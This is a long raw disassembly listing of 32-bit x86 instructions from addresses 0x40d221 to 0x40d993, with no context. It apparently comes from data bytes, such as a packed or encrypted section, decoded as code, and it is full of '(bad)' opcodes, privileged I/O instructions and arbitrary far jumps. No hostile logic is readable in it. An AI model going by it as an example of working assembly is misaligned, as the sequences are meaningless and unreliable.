  40d221:	sub    DWORD PTR [esi+0xc7d3743],0x76
  40d228:	push   ecx
  40d229:	add    eax,0x15fb8846
  40d22e:	mov    es:0x7d9e481d,al
  40d234:	mov    ebx,0xc49bbe19
  40d239:	jmp    0xa481:0xc879192e
  40d240:	mov    al,ds:0xdee87ad5
  40d245:	jbe    0x40d28e
  40d247:	xchg   BYTE PTR [ebx-0x2299b154],bl
  40d24d:	lods   eax,DWORD PTR ds:[esi]
  40d24e:	dec    eax
  40d24f:	shl    BYTE PTR [eax+0x61ed298a],1
  40d255:	jge    0x40d227
  40d257:	push   esp
  40d258:	neg    BYTE PTR [ecx+eax*4-0x4736ead1]
  40d25f:	xor    DWORD PTR [edi+0x4c58151d],ecx
  40d265:	adc    al,0x17
  40d267:	loopne 0x40d223
  40d269:	lea    edi,[esi+0x4f5d6455]
  40d26f:	mov    eax,ds:0x65b9622f
  40d274:	cmp    DWORD PTR [esi+0x3425c970],ebp
  40d27a:	out    dx,eax
  40d27b:	adc    eax,0xd0d0f677
  40d280:	lea    edi,[ecx]
  40d282:	xor    BYTE PTR [edx+edx*4],dl
  40d285:	inc    eax
  40d286:	js     0x40d27d
  40d288:	(bad)  
  40d289:	push   esp
  40d28a:	sti    
  40d28b:	xchg   edx,eax
  40d28c:	xchg   ecx,eax
  40d28d:	imul   ebx,DWORD PTR [esi],0xd37d4b70
  40d293:	pop    esi
  40d294:	fild   QWORD PTR [ebx+esi*1-0x2187bf30]
  40d29b:	add    DWORD PTR [esi],edi
  40d29d:	mov    cl,0x61
  40d29f:	push   eax
  40d2a0:	sbb    al,0x63
  40d2a2:	test   DWORD PTR [ebp+0x3497db53],ebx
  40d2a8:	mov    esp,ebx
  40d2aa:	ret    
  40d2ab:	test   al,0xb5
  40d2ad:	mov    ecx,0xda163485
  40d2b2:	or     eax,esp
  40d2b4:	push   eax
  40d2b5:	cli    
  40d2b6:	cli    
  40d2b7:	std    
  40d2b8:	cld    
  40d2b9:	fistp  WORD PTR [eax]
  40d2bb:	pop    esi
  40d2bc:	sbb    dl,BYTE PTR [eax-0x2a]
  40d2bf:	mov    dl,0xcf
  40d2c1:	test   al,0xd4
  40d2c3:	(bad)  
  40d2c4:	(bad)  
  40d2c5:	cmp    al,0x3d
  40d2c7:	push   edi
  40d2c8:	and    eax,0xa5d45b2d
  40d2cd:	arpl   WORD PTR [edx],cx
  40d2cf:	jecxz  0x40d2f0
  40d2d1:	aam    0xdf
  40d2d3:	js     0x40d32e
  40d2d5:	fld    TBYTE PTR [ecx+0x46a7cdb3]
  40d2db:	mov    dh,BYTE PTR [eax]
  40d2dd:	xor    DWORD PTR [ecx],edi
  40d2df:	popa   
  40d2e0:	repz das 
  40d2e2:	cmp    ah,BYTE PTR ds:0x16392dc6
  40d2e8:	ja     0x40d356
  40d2ea:	loope  0x40d310
  40d2ec:	mov    edx,0x27cbf0ab
  40d2f1:	adc    bh,BYTE PTR [ecx-0x29]
  40d2f4:	sbb    al,0x1b
  40d2f6:	rol    edx,1
  40d2f8:	and    DWORD PTR [ebx],ecx
  40d2fa:	mov    ebx,0x550a737
  40d2ff:	ret    0x194f
  40d302:	(bad)  
  40d303:	div    DWORD PTR [ebp-0x1a]
  40d306:	and    ecx,DWORD PTR [esi]
  40d308:	in     eax,dx
  40d309:	paddw  mm0,QWORD PTR fs:[edx+0x111664bc]
  40d311:	(bad)  
  40d313:	jnp    0x40d2ea
  40d315:	cli    
  40d316:	and    BYTE PTR ds:[edx+0x7d],dl
  40d31a:	lahf   
  40d31b:	pop    eax
  40d31c:	mov    al,ds:0xf8744089
  40d321:	inc    edi
  40d322:	mov    BYTE PTR ds:0x53c8f58e,bh
  40d328:	dec    esp
  40d329:	dec    ah
  40d32b:	xchg   esp,eax
  40d32c:	sub    BYTE PTR [ebx+0x6ae69b5a],cl
  40d332:	inc    edx
  40d334:	xchg   DWORD PTR [esi-0x512ba499],esp
  40d33a:	inc    eax
  40d33b:	mov    ebp,ebp
  40d33d:	scas   al,BYTE PTR es:[edi]
  40d33e:	mov    ebp,0x2031125c
  40d343:	inc    ebp
  40d344:	loop   0x40d2f9
  40d346:	jg     0x40d2ee
  40d348:	mov    dl,0x80
  40d34a:	jo     0x40d3b8
  40d34c:	neg    BYTE PTR [esi]
  40d34e:	ss pop ss
  40d350:	(bad)  
  40d351:	xor    eax,0x8e7e2373
  40d356:	fbstp  TBYTE PTR ds:0x5823ecdd
  40d35c:	cmp    esp,DWORD PTR [ebx]
  40d35e:	loop   0x40d35c
  40d360:	xchg   esi,eax
  40d361:	xchg   BYTE PTR [ecx-0x6ecc672d],ch
  40d367:	in     eax,dx
  40d368:	pop    esp
  40d369:	jno    0x40d32c
  40d36b:	ret    
  40d36c:	fld    QWORD PTR [ebp-0x3e7083e1]
  40d372:	mov    dl,0xdb
  40d374:	mov    ch,0x5b
  40d376:	push   esp
  40d377:	ds ds mov dl,0xd1
  40d37b:	in     al,0xd2
  40d37d:	push   edx
  40d37e:	jmp    0x40d30b
  40d380:	sub    DWORD PTR [esi+0x3cbfd409],ebp
  40d386:	push   es
  40d387:	mov    dh,BYTE PTR [edx+esi*4-0x9a1fef4]
  40d38e:	test   edx,esp
  40d390:	(bad)  
  40d391:	mov    al,ds:0x9ee6eef1
  40d396:	retf   0x1fc6
  40d399:	sahf   
  40d39a:	std    
  40d39b:	cmp    cl,BYTE PTR [ebp+0x5d]
  40d39e:	fist   WORD PTR gs:[edx+edi*8+0x133fdef]
  40d3a6:	es dec ecx
  40d3a8:	mov    eax,ds:0x24d3e8e4
  40d3ad:	sub    edi,DWORD PTR [edx+0x4d]
  40d3b0:	hlt    
  40d3b1:	aad    0xb7
  40d3b3:	outs   dx,BYTE PTR ds:[esi]
  40d3b4:	out    0xc,eax
  40d3b6:	push   ds
  40d3b7:	sbb    dl,al
  40d3b9:	xor    DWORD PTR [ecx],edx
  40d3bb:	xchg   esi,eax
  40d3bc:	clc    
  40d3bd:	xchg   ebp,eax
  40d3be:	std    
  40d3bf:	mov    eax,ds:0x15c6079
  40d3c4:	xchg   ebx,eax
  40d3c5:	mov    ecx,0x4c696b97
  40d3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3cb:	xchg   edx,eax
  40d3cc:	xlat   BYTE PTR ds:[ebx]
  40d3cd:	push   0xffffffac
  40d3cf:	retf   
  40d3d0:	jmp    0x649907bf
  40d3d5:	aas    
  40d3d6:	xchg   esp,eax
  40d3d7:	sub    BYTE PTR [esi+0x7d91ec3c],dl
  40d3dd:	bound  eax,QWORD PTR [eax-0x4473c2eb]
  40d3e3:	inc    ecx
  40d3e4:	xchg   DWORD PTR [eax-0x5d463438],ecx
  40d3ea:	inc    BYTE PTR [ebp-0x3fd62220]
  40d3f0:	js     0x40d44d
  40d3f2:	jmp    0x40d384
  40d3f4:	popa   
  40d3f5:	test   BYTE PTR [edi-0x35],0x60
  40d3f9:	mov    edi,0x19751e80
  40d3fe:	add    DWORD PTR [esi-0x6a4372b],edx
  40d404:	pop    es
  40d405:	push   0xffffff9d
  40d407:	xor    dh,BYTE PTR [esi]
  40d409:	(bad)  
  40d40a:	and    bl,cl
  40d40c:	xor    esp,DWORD PTR [esi-0x7f]
  40d40f:	jecxz  0x40d3ee
  40d411:	inc    ebx
  40d412:	push   0xffffffbe
  40d414:	xor    edx,DWORD PTR [edi-0x4b7d2887]
  40d41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d41b:	aad    0x34
  40d41d:	xchg   ebx,eax
  40d41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d41f:	sahf   
  40d420:	mov    cl,BYTE PTR [ebx-0x512174ac]
  40d426:	mov    esi,0xbb296406
  40d42b:	lods   al,BYTE PTR ds:[esi]
  40d42c:	fcomp  st(4)
  40d42e:	mov    dl,0x18
  40d430:	imul   esi,ebp,0x71
  40d433:	(bad)  
  40d435:	mov    al,BYTE PTR ds:0x7fb2f924
  40d43b:	sbb    BYTE PTR [ebx+0x55f17237],al
  40d441:	sbb    ebp,DWORD PTR [eax-0x54]
  40d444:	hlt    
  40d445:	test   BYTE PTR [ebp+eax*2+0x49d6f3cc],bh
  40d44c:	mov    ds:0x3d8acffc,al
  40d451:	jns    0x40d3ee
  40d453:	aaa    
  40d454:	repz mov esi,0x78b98be5
  40d45a:	or     eax,0x7670cf5c
  40d45f:	scas   al,BYTE PTR es:[edi]
  40d460:	sub    edx,DWORD PTR [edx+0x37]
  40d463:	dec    esi
  40d464:	adc    DWORD PTR [ebx],ecx
  40d466:	ret    0xc963
  40d469:	and    eax,0xf924bcf7
  40d46e:	sbb    eax,0x4f1f3377
  40d473:	pop    eax
  40d474:	enter  0x7a57,0xc7
  40d478:	xchg   DWORD PTR [edi],esi
  40d47a:	inc    esp
  40d47b:	push   ds
  40d47c:	out    dx,al
  40d47d:	test   ah,ch
  40d47f:	and    esp,esi
  40d481:	icebp  
  40d482:	jge    0x40d4a4
  40d484:	bound  ebx,QWORD PTR [esi-0x44]
  40d487:	push   ebp
  40d488:	mov    dl,0x54
  40d48a:	std    
  40d48b:	xchg   edi,eax
  40d48c:	sub    eax,0x83d1f5a1
  40d491:	dec    ecx
  40d492:	mov    edi,0x86486ad2
  40d497:	aam    0x7f
  40d499:	mov    edi,0xa42ad20f
  40d49e:	dec    edx
  40d49f:	(bad)  
  40d4a0:	inc    edi
  40d4a1:	inc    esi
  40d4a2:	jp     0x40d430
  40d4a4:	sbb    DWORD PTR [ebp-0x6b],esp
  40d4a7:	mov    al,bh
  40d4a9:	jecxz  0x40d4df
  40d4ab:	(bad)  
  40d4ac:	cli    
  40d4ad:	pop    edx
  40d4ae:	dec    edx
  40d4af:	fs and edi,ecx
  40d4b2:	sbb    edx,DWORD PTR ds:0x498633cf
  40d4b8:	xor    dh,BYTE PTR [edi-0x7b]
  40d4bb:	sub    al,0xb6
  40d4bd:	rcl    edi,1
  40d4bf:	rol    DWORD PTR [esi+0x24ab50ee],1
  40d4c5:	and    eax,0x52523743
  40d4ca:	or     DWORD PTR [esi+0x278fa1f1],edx
  40d4d0:	adc    BYTE PTR [esi+0x2f9c1f27],dl
  40d4d6:	ret    
  40d4d7:	and    cl,BYTE PTR [esi]
  40d4d9:	das    
  40d4da:	jns    0x40d4e3
  40d4dc:	int    0x93
  40d4de:	icebp  
  40d4df:	mov    ebp,0xc7e78762
  40d4e4:	repz mov dh,0xad
  40d4e7:	jmp    0x301fd269
  40d4ec:	xchg   esi,eax
  40d4ed:	cmp    BYTE PTR cs:[esi],dl
  40d4f0:	jae    0x40d4c7
  40d4f2:	cmp    eax,0x935537f0
  40d4f7:	jno    0x40d47a
  40d4f9:	push   ss
  40d4fa:	iret   
  40d4fb:	push   cs
  40d4fc:	and    BYTE PTR [esp+ebp*4],dh
  40d4ff:	xor    eax,0x12019751
  40d504:	cmp    edx,DWORD PTR [edi+ebx*1-0x17]
  40d508:	mov    al,0xe1
  40d50a:	jne    0x40d54f
  40d50c:	fwait
  40d50d:	dec    ecx
  40d50e:	shl    DWORD PTR [edi-0x6ffc7a4b],cl
  40d514:	(bad)  
  40d515:	popa   
  40d516:	or     ebp,0xffffffd9
  40d519:	lds    ebp,FWORD PTR [esi]
  40d51b:	adc    esi,edx
  40d51d:	test   DWORD PTR [eax],ebx
  40d51f:	adc    ecx,DWORD PTR [esi+0x283db0a6]
  40d525:	hlt    
  40d526:	xlat   BYTE PTR ds:[ebx]
  40d527:	jle    0x40d4e9
  40d529:	mov    dh,0xfd
  40d52b:	into   
  40d52c:	dec    ebp
  40d52d:	jp     0x40d58e
  40d52f:	stos   BYTE PTR es:[edi],al
  40d530:	and    BYTE PTR [edx],al
  40d532:	in     eax,0x90
  40d534:	idiv   BYTE PTR [ebp-0x7c84c482]
  40d53a:	jmp    0xad0082be
  40d53f:	ds mov eax,0xb02770ec
  40d545:	(bad)  
  40d546:	pop    edx
  40d547:	xchg   edi,eax
  40d548:	arpl   sp,si
  40d54a:	and    edx,DWORD PTR [ecx-0x703b36a2]
  40d550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d551:	pop    esp
  40d552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d553:	nop
  40d554:	(bad)  
  40d555:	adc    BYTE PTR ss:0x22ba3a83,bl
  40d55c:	mov    BYTE PTR [edi-0x72],ch
  40d55f:	repnz xchg esi,eax
  40d561:	cs jl  0x40d53e
  40d564:	add    al,0x13
  40d566:	or     eax,0x1b1ee798
  40d56b:	mov    ecx,0xc2f4f91e
  40d570:	xchg   ebx,eax
  40d571:	popw   ss
  40d573:	and    ah,BYTE PTR [ecx+eax*8+0x17]
  40d577:	stos   DWORD PTR es:[edi],eax
  40d578:	inc    eax
  40d579:	jno    0x40d59f
  40d57b:	pop    ebp
  40d57c:	cli    
  40d57d:	push   ebp
  40d57e:	xchg   DWORD PTR [ebx],ebx
  40d580:	icebp  
  40d581:	out    dx,al
  40d582:	retf   
  40d583:	mov    al,BYTE PTR [edi-0x5f0bdad6]
  40d589:	cdq    
  40d58a:	cwde   
  40d58b:	in     eax,dx
  40d58c:	push   esi
  40d58d:	jno    0x40d5e7
  40d58f:	inc    esi
  40d590:	or     esp,DWORD PTR [esi-0x3eb5f0c6]
  40d596:	dec    ebp
  40d597:	scas   al,BYTE PTR es:[edi]
  40d598:	je     0x40d586
  40d59a:	mov    ch,0x90
  40d59c:	and    al,0xe4
  40d59e:	mov    ah,0x61
  40d5a0:	imul   esp,edx,0x2a
  40d5a3:	retf   
  40d5a4:	and    al,0x68
  40d5a6:	mov    ds:0xee9b3b8d,eax
  40d5ab:	adc    al,0xd0
  40d5ad:	into   
  40d5ae:	gs (bad) 
  40d5b0:	std    
  40d5b1:	inc    ecx
  40d5b2:	inc    ebx
  40d5b3:	xchg   ebp,eax
  40d5b4:	xchg   esi,eax
  40d5b5:	jp     0x40d623
  40d5b7:	jnp    0x40d623
  40d5b9:	pop    ebp
  40d5ba:	push   ss
  40d5bb:	je     0x40d555
  40d5bd:	daa    
  40d5be:	stos   DWORD PTR es:[edi],eax
  40d5bf:	cs xlat BYTE PTR fs:[ebx]
  40d5c2:	lahf   
  40d5c3:	push   0x7c
  40d5c5:	in     eax,0x14
  40d5c7:	add    DWORD PTR [edi],ebp
  40d5c9:	push   0x30a5711f
  40d5ce:	sbb    al,0x8
  40d5d0:	fnsave [eax]
  40d5d2:	scas   al,BYTE PTR es:[edi]
  40d5d3:	jl     0x40d586
  40d5d5:	sahf   
  40d5d6:	pop    es
  40d5d7:	popa   
  40d5d8:	ss loopne 0x40d60b
  40d5db:	xor    BYTE PTR [eax+0x14fe820e],cl
  40d5e1:	pop    ebx
  40d5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e3:	popf   
  40d5e4:	sbb    eax,0x692aac8c
  40d5e9:	inc    esi
  40d5ea:	pusha  
  40d5eb:	push   edx
  40d5ec:	add    DWORD PTR [esi+0x5cc884ad],edi
  40d5f2:	adc    eax,0x2db610b1
  40d5f7:	scas   al,BYTE PTR es:[edi]
  40d5f8:	jmp    0x1103:0xc9f08b76
  40d5ff:	pop    ebp
  40d600:	mov    ebx,0x4e1887be
  40d605:	mov    ebx,0xeae3e8e6
  40d60a:	dec    edi
  40d60b:	pop    esp
  40d60c:	ja     0x40d657
  40d60e:	enter  0x1299,0xba
  40d612:	imul   edx,DWORD PTR [esi+0x6b25dc4],0xffffffb0
  40d619:	pop    edi
  40d61a:	lahf   
  40d61b:	shl    esp,cl
  40d61d:	int    0x66
  40d61f:	or     DWORD PTR [esi+0x68],0xffffffba
  40d623:	std    
  40d624:	and    al,0x39
  40d626:	popf   
  40d627:	push   ds
  40d628:	(bad)  
  40d629:	loopne 0x40d61e
  40d62b:	xchg   ebp,eax
  40d62c:	test   DWORD PTR [esi],esp
  40d62e:	shl    DWORD PTR [ecx+0xa],cl
  40d631:	sub    esp,DWORD PTR [edx+0x7f]
  40d634:	add    eax,DWORD PTR ds:0xec90b7a8
  40d63a:	xor    DWORD PTR [esi-0x30],0x5b31f93b
  40d641:	sbb    esp,edi
  40d643:	jecxz  0x40d62a
  40d645:	stos   DWORD PTR es:[edi],eax
  40d646:	mov    ds:0x3a34af3f,al
  40d64b:	push   cs
  40d64c:	int3   
  40d64d:	adc    bh,BYTE PTR [ecx+0x8c97bc9]
  40d653:	sub    eax,ebp
  40d655:	jnp    0x40d629
  40d657:	(bad)  
  40d658:	mov    eax,ds:0x25351d5b
  40d65d:	and    eax,0xe5ae485b
  40d662:	jg     0x40d673
  40d664:	pop    eax
  40d665:	sub    al,0x20
  40d667:	sub    eax,0x57f85ae0
  40d66c:	sbb    BYTE PTR ds:0x32501b6f,dl
  40d672:	rcl    DWORD PTR [eax+0x30],1
  40d675:	or     esp,DWORD PTR [edx+0x3532a41d]
  40d67b:	(bad)  
  40d67c:	pop    ebp
  40d67d:	arpl   ax,di
  40d67f:	cmp    al,BYTE PTR [ebx]
  40d681:	sbb    al,0xcd
  40d683:	sbb    DWORD PTR [ebx+ecx*4+0x70],edx
  40d687:	add    eax,0xa3e0f65c
  40d68c:	jmp    0x739:0x6385b49a
  40d693:	aaa    
  40d694:	rcr    BYTE PTR [esi],1
  40d696:	lock mov ?,ebx
  40d699:	cmp    BYTE PTR [esi+0x6ce80b82],dh
  40d69f:	shl    BYTE PTR [ebp-0x5b],0xb2
  40d6a3:	inc    eax
  40d6a4:	inc    ecx
  40d6a5:	fld    TBYTE PTR [esi+0x4eb5e0ac]
  40d6ab:	cdq    
  40d6ac:	and    al,0xc
  40d6ae:	inc    ecx
  40d6af:	mov    ecx,0xc619d555
  40d6b4:	ss mov ch,dh
  40d6b7:	lock (bad) 
  40d6ba:	(bad)  
  40d6bc:	mov    al,0xfd
  40d6be:	mov    ah,0xef
  40d6c0:	lods   eax,DWORD PTR ds:[esi]
  40d6c1:	add    al,0xbb
  40d6c3:	cmp    eax,DWORD PTR [ebp+edx*1-0x488e04da]
  40d6ca:	sub    eax,0x1d2b9ca8
  40d6cf:	sbb    DWORD PTR [eax-0x51c864eb],0x71b1d7eb
  40d6d9:	adc    dh,cl
  40d6db:	int    0x35
  40d6dd:	shl    DWORD PTR [ebx-0x52],0x3
  40d6e1:	mov    al,BYTE PTR [ecx]
  40d6e3:	jle    0x40d743
  40d6e5:	adc    edx,DWORD PTR [edi+0x75]
  40d6e8:	outs   dx,BYTE PTR ds:[esi]
  40d6e9:	daa    
  40d6ea:	ds dec esi
  40d6ec:	mov    ecx,DWORD PTR [eax]
  40d6ee:	xor    al,BYTE PTR [ecx-0x6]
  40d6f1:	xchg   edx,eax
  40d6f2:	cmp    DWORD PTR [edx-0x4c],edi
  40d6f5:	xchg   edx,eax
  40d6f6:	in     eax,0x73
  40d6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6f9:	addr16 mov ebx,0xaa885d3b
  40d6ff:	in     al,dx
  40d700:	lods   al,BYTE PTR ds:[esi]
  40d701:	gs add al,0xea
  40d704:	sbb    ecx,DWORD PTR [ecx]
  40d706:	outs   dx,DWORD PTR ds:[esi]
  40d707:	xchg   ebx,eax
  40d708:	fwait
  40d709:	mov    al,0x7f
  40d70b:	xor    BYTE PTR [ebp-0x1f],ch
  40d70e:	xor    bh,cl
  40d710:	scas   al,BYTE PTR es:[edi]
  40d711:	adc    BYTE PTR [esi],ch
  40d713:	retf   
  40d714:	adc    al,0x4c
  40d716:	outs   dx,BYTE PTR ds:[esi]
  40d717:	mov    DWORD PTR [ebp+0x25],ebp
  40d71a:	or     ch,ch
  40d71c:	ss jp  0x40d742
  40d71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d720:	push   0x76
  40d722:	(bad)  [edi+edi*1]
  40d725:	cmp    al,0x56
  40d727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d728:	je     0x40d73a
  40d72a:	mov    BYTE PTR [esi+0x1b],ah
  40d72d:	shr    BYTE PTR [esi+0x2d72f4c9],0xe2
  40d734:	mov    bh,0xe3
  40d736:	jmp    0xbb0967af
  40d73b:	lods   al,BYTE PTR ds:[esi]
  40d73c:	mov    cl,0xa
  40d73e:	out    0x3c,al
  40d740:	mov    ecx,0xaaf40941
  40d745:	cmp    BYTE PTR [esi+0x76603523],dl
  40d74b:	out    0xfd,eax
  40d74d:	pop    ss
  40d74e:	scas   eax,DWORD PTR es:[edi]
  40d74f:	add    ebx,DWORD PTR [eax]
  40d751:	push   eax
  40d752:	cmp    DWORD PTR [esi],ebx
  40d754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d755:	nop
  40d756:	icebp  
  40d757:	mov    WORD PTR [eax+0x3f43ad25],es
  40d75d:	pop    ss
  40d75e:	jo     0x40d774
  40d760:	pop    ss
  40d761:	outs   dx,BYTE PTR ds:[esi]
  40d762:	pushf  
  40d763:	leave  
  40d764:	adc    bl,BYTE PTR [ebx-0x3695e5a0]
  40d76a:	dec    ecx
  40d76b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d76c:	pusha  
  40d76d:	xor    BYTE PTR [ebx-0x10986c90],ah
  40d773:	repz jl 0x40d76e
  40d776:	dec    esi
  40d777:	fdiv   QWORD PTR [esi+0x7e834c9b]
  40d77d:	cdq    
  40d77e:	pop    esi
  40d77f:	add    cl,ch
  40d781:	jnp    0x40d7fb
  40d783:	pop    edi
  40d784:	dec    ebp
  40d785:	movd   DWORD PTR [eax+eiz*2-0x1f5b41c],mm6
  40d78d:	out    0x5c,eax
  40d78f:	cdq    
  40d790:	pushf  
  40d791:	add    ch,BYTE PTR [eax]
  40d793:	outs   dx,BYTE PTR ds:[esi]
  40d794:	mov    DWORD PTR [edx-0x5acbb5dc],ecx
  40d79a:	cmp    DWORD PTR [eax-0x10],ebp
  40d79d:	jno    0x40d7c1
  40d79f:	fsub   QWORD PTR [ebx+edx*4+0x4f]
  40d7a3:	les    edx,FWORD PTR [esi+eiz*1+0x6497b470]
  40d7aa:	mov    al,0x2e
  40d7ac:	xor    DWORD PTR [ecx+0xe83c764],ecx
  40d7b2:	test   al,0xe
  40d7b4:	mov    edx,0x50abcd77
  40d7b9:	mov    edi,DWORD PTR [ecx+0x393ade21]
  40d7bf:	add    dh,BYTE PTR [ebx+0x4e]
  40d7c2:	sub    al,0x8b
  40d7c4:	stos   BYTE PTR es:[edi],al
  40d7c5:	jmp    0xe3c6cd98
  40d7ca:	or     BYTE PTR [ecx-0x1d9240dc],dl
  40d7d0:	jbe    0x40d7f8
  40d7d2:	xor    esp,DWORD PTR [edx-0x751ffb3f]
  40d7d8:	or     al,0x14
  40d7da:	sbb    BYTE PTR [esi],ch
  40d7dc:	sbb    DWORD PTR [ebx+ebx*4+0x6d],edx
  40d7e0:	(bad)
  40d7e4:	mov    bl,0xb5
  40d7e6:	pop    esp
  40d7e7:	sbb    BYTE PTR [ecx],bh
  40d7e9:	imul   esp,DWORD PTR [eax],0x74
  40d7ec:	and    eax,0x2e4434
  40d7f1:	mov    eax,0xf43b642f
  40d7f6:	in     al,0xd
  40d7f8:	xchg   DWORD PTR [esi-0x2748c13c],ecx
  40d7fe:	inc    ebx
  40d7ff:	test   eax,0x26375a22
  40d804:	and    eax,0xad3960bf
  40d809:	arpl   WORD PTR [edx-0x3e],ax
  40d80c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d80d:	xchg   ebp,eax
  40d80e:	or     ecx,DWORD PTR [eax+0x24fa71d6]
  40d814:	call   0xb366:0xb1ca2035
  40d81b:	lods   eax,DWORD PTR ds:[esi]
  40d81c:	inc    edx
  40d81d:	outs   dx,DWORD PTR ds:[esi]
  40d81e:	pop    es
  40d81f:	test   eax,0xe735c8e3
  40d824:	and    esi,esp
  40d826:	and    ebp,eax
  40d828:	neg    DWORD PTR [eax+0x8]
  40d82b:	loopne 0x40d828
  40d82d:	add    ebx,ebx
  40d82f:	and    BYTE PTR [ebp+0x15520214],bh
  40d835:	push   ecx
  40d836:	mov    dl,0x11
  40d838:	in     eax,0x7d
  40d83a:	jbe    0x40d8a1
  40d83c:	sbb    eax,0xd3d6c1fb
  40d841:	fs aaa 
  40d843:	xchg   BYTE PTR [ecx-0x3a],ch
  40d846:	(bad)  
  40d847:	pop    ecx
  40d848:	and    DWORD PTR [esi],edx
  40d84a:	mov    ds:0x37e8bb72,al
  40d84f:	sbb    DWORD PTR [ebx+0x29],ecx
  40d852:	aam    0xdb
  40d854:	push   cs
  40d855:	mov    ah,bh
  40d857:	pop    edx
  40d858:	xor    eax,DWORD PTR [edi+0x32]
  40d85b:	sbb    DWORD PTR [ebx+0x1d8c4045],esp
  40d861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d862:	mov    esi,0xf9cd3297
  40d867:	test   DWORD PTR [ecx-0x6f],esi
  40d86a:	out    dx,eax
  40d86b:	mov    al,0xf9
  40d86d:	bnd jns 0x40d8c6
  40d870:	jno    0x40d8d4
  40d872:	sbb    DWORD PTR [ebx-0x3e],0x62
  40d876:	mov    al,0x40
  40d878:	fcom   QWORD PTR [ecx-0x2]
  40d87b:	stos   DWORD PTR es:[edi],eax
  40d87c:	xchg   bh,bl
  40d87e:	je     0x40d899
  40d880:	int    0x1
  40d882:	call   0x99ccbf6d
  40d887:	xchg   esp,eax
  40d888:	fisubr WORD PTR [ecx]
  40d88a:	fwait
  40d88b:	xor    esi,DWORD PTR [esi+0x3adc7336]
  40d891:	mov    bl,0xc1
  40d893:	mov    ecx,DWORD PTR [edx-0x7e]
  40d896:	mul    BYTE PTR [ebx+0x18]
  40d899:	mov    esi,eax
  40d89b:	adc    eax,0x54e5f25d
  40d8a0:	sub    BYTE PTR [ebx],ah
  40d8a2:	jnp    0x40d85f
  40d8a4:	pop    ecx
  40d8a5:	mov    esi,0x2de156d7
  40d8aa:	mov    ebx,0xf096c456
  40d8af:	mov    eax,ds:0x2a852441
  40d8b4:	cmp    ebx,DWORD PTR ds:0xef5a5af
  40d8ba:	mov    BYTE PTR [ebx-0x79],ch
  40d8bd:	jmp    0x40d924
  40d8bf:	or     eax,0xb8dc3f52
  40d8c4:	cmp    al,0x9a
  40d8c6:	cmp    eax,0x512c3cf7
  40d8cb:	cmc    
  40d8cc:	and    DWORD PTR [ecx+0x78643001],edx
  40d8d2:	xchg   BYTE PTR [ecx],bl
  40d8d4:	aad    0xa2
  40d8d6:	mov    eax,0xd0194428
  40d8db:	mov    ch,0x40
  40d8dd:	mov    al,0xe4
  40d8df:	retf   0xfe5
  40d8e2:	push   esp
  40d8e3:	not    BYTE PTR [ebx]
  40d8e5:	push   0x50f751ef
  40d8ea:	dec    esp
  40d8eb:	mov    al,ds:0x81bf1729
  40d8f0:	push   0x9
  40d8f2:	sar    BYTE PTR [edi],cl
  40d8f4:	scas   eax,DWORD PTR es:[edi]
  40d8f5:	mov    ah,0xb4
  40d8f7:	dec    edx
  40d8f8:	ror    BYTE PTR [edx+0x7d],1
  40d8fb:	aaa    
  40d8fc:	es popf 
  40d8fe:	fdiv   st(7),st
  40d900:	cmp    BYTE PTR ds:0x5ba37ecf,dl
  40d906:	push   eax
  40d907:	es sar bh,1
  40d90a:	push   0xffffffdb
  40d90c:	fsubr  DWORD PTR [ebx+0x1d201d2b]
  40d912:	jne    0x40d936
  40d914:	icebp  
  40d915:	fwait
  40d916:	and    al,0xfb
  40d918:	ror    DWORD PTR [esi-0x5dc60d88],1
  40d91e:	out    0x15,eax
  40d920:	jo     0x40d934
  40d922:	mov    dl,bh
  40d924:	cwde   
  40d925:	adc    al,0xf8
  40d927:	(bad)  
  40d928:	out    0x59,al
  40d92a:	cwde   
  40d92b:	iret   
  40d92c:	icebp  
  40d92d:	aam    0x3b
  40d92f:	mov    edx,0x1dbe3131
  40d934:	les    ecx,FWORD PTR [edx]
  40d936:	cmp    DWORD PTR [edx-0x7372540a],ebp
  40d93c:	stos   BYTE PTR es:[edi],al
  40d93d:	ror    edx,0x60
  40d940:	mov    dl,0xbe
  40d942:	out    0xce,al
  40d944:	mov    bl,0x26
  40d946:	aas    
  40d947:	into   
  40d948:	adc    eax,0x343b568b
  40d94d:	ins    DWORD PTR es:[edi],dx
  40d94e:	xchg   ecx,eax
  40d94f:	mov    bl,BYTE PTR [ebx-0x7a]
  40d952:	out    dx,al
  40d953:	mov    dl,0xc9
  40d955:	inc    BYTE PTR [ecx+0x20]
  40d958:	hlt    
  40d959:	sub    al,0x45
  40d95b:	iret   
  40d95c:	in     eax,0xce
  40d95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d95f:	mov    bh,0xb8
  40d961:	jno    0x40d9b3
  40d963:	and    al,0x1f
  40d965:	scas   eax,DWORD PTR es:[edi]
  40d966:	pusha  
  40d967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d968:	xor    al,0xcc
  40d96a:	sti    
  40d96b:	lds    ebx,FWORD PTR [ecx]
  40d96d:	cmp    ebx,ebx
  40d96f:	stos   DWORD PTR es:[edi],eax
  40d970:	clc    
  40d971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d972:	repz mov ecx,0x65281307
  40d978:	mov    bh,0x8a
  40d97a:	repz in eax,dx
  40d97c:	mov    ebx,0x49a7a8ae
  40d981:	aas    
  40d982:	in     eax,dx
  40d983:	pop    es
  40d984:	int3   
  40d985:	daa    
  40d986:	add    al,0x42
  40d988:	inc    ecx
  40d989:	repz out dx,eax
  40d98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d98c:	enter  0x79b4,0x61
  40d990:	push   ecx
  40d991:	out    0x99,al
  40d993:	sbb    al,0x5d
